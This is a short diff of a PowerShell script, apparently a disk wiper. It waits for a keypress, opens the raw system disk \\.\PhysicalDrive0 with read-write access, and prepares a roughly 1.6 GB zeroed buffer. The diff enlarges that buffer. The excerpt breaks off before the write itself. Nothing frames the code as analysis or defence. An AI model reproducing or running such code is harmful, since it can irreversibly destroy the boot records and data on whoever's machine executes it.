@@ -1,6 +1,6 @@
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 $disk = "\\.\PhysicalDrive0"
-$size = 1240960000
+$size = 1640960000
 $bytes = New-Object byte[]($size)
 try {
     $stream = New-Object System.IO.FileStream($disk, 'Open', 'ReadWrite')
